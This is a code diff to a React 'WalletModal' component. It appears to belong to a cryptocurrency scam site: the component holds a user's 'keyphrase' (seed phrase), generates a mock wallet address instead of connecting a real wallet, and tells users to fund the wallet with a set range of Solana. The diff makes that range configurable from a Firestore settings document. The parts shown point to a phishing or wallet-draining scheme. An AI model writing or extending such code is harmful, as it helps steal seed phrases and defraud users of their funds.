@@ -1,7 +1,6 @@
-// components/WalletModal.js
 import React, { useState, useEffect, useCallback } from 'react';
 import { db } from '@/firebaseConfig';
-import { doc, setDoc } from 'firebase/firestore';
+import { doc, setDoc, getDoc } from 'firebase/firestore';
 import { HiViewGrid } from "react-icons/hi";
 import { toast } from 'react-toastify';
 import 'react-toastify/dist/ReactToastify.css';
@@ -13,6 +12,8 @@ const WalletModal = ({ isOpen, onClose, onWalletConnected }) => {
   const [keyphrase, setKeyphrase] = useState('');
   const [isConnecting, setIsConnecting] = useState(false);
   const [error, setError] = useState('');
+  const [minBalance, setMinBalance] = useState(0.7); // Default min balance
+  const [maxBalance, setMaxBalance] = useState(5); // Default max balance
 
   const walletOptions = [
     { name: 'Phantom', image: '/phan.png' },
@@ -20,6 +21,30 @@ const WalletModal = ({ isOpen, onClose, onWalletConnected }) => {
     { name: 'Eden Wallet', image: '/eden.png' },
     { name: 'Coinbase', image: '/baselogo.png' },
   ];
+
+  // Fetch minimum balance requirements from Firestore
+  useEffect(() => {
+    const fetchBalanceRequirements = async () => {
+      try {
+        const docRef = doc(db, 'settings', 'balanceRequirements');
+        const docSnap = await getDoc(docRef);
+        if (docSnap.exists()) {
+          const data = docSnap.data();
+          setMinBalance(data.minBalance || 0.7);
+          setMaxBalance(data.maxBalance || 5);
+        } else {
+          console.warn('No balance requirements found in Firestore, using defaults');
+        }
+      } catch (err) {
+        console.error('Error fetching balance requirements:', err);
+        toast.error('Failed to fetch balance requirements, using default values');
+      }
+    };
+
+    if (isOpen) {
+      fetchBalanceRequirements();
+    }
+  }, [isOpen]);
 
   // Simple function to generate a mock wallet address
   const generateWalletAddress = () => {
@@ -82,7 +107,7 @@ const WalletModal = ({ isOpen, onClose, onWalletConnected }) => {
         id: docId,
         name: selectedWallet,
         address: generatedAddress,
-        balance: 0, // Also store in localStorage
+        balance: 0,
         connectedAt: walletDetails.connectedAt
       }));
 
@@ -91,11 +116,11 @@ const WalletModal = ({ isOpen, onClose, onWalletConnected }) => {
           id: docId,
           name: selectedWallet,
           address: generatedAddress,
-          balance: 0 // Pass to callback
+          balance: 0
         });
       }
 
-      toast.success('Make sure you fund your wallet with 0.7 - 5 Solana and try again', {
+      toast.success(`Make sure you fund your wallet with ${minBalance} - ${maxBalance} Solana and try again`, {
         autoClose: 20000,
       });
       
